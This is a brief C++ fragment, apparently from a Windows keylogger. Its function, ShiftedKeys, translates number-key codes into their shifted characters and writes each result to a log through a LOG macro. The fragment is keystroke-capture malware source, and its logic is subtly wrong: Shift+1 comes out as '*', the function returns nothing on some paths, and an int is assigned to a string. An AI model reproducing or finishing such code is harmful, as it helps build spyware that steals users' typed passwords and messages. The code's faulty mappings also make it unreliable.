#include <Windows.h>
#include <winuser.h>
#include <bits/stdc++.h>
#include "log.h"

using namespace std;

bool ShiftedKeys (int ShiftedKeys, string ShiftedKeys_Logged){
	switch (ShiftedKeys){
	case 48://[0]
		ShiftedKeys -= 7;
        ShiftedKeys_Logged = ShiftedKeys;
		LOG (ShiftedKeys_Logged);
		return true;
    case 49://[1]
        ShiftedKeys -= 7;
        ShiftedKeys_Logged = ShiftedKeys;
        LOG (ShiftedKeys_Logged);
        return true;
    }
}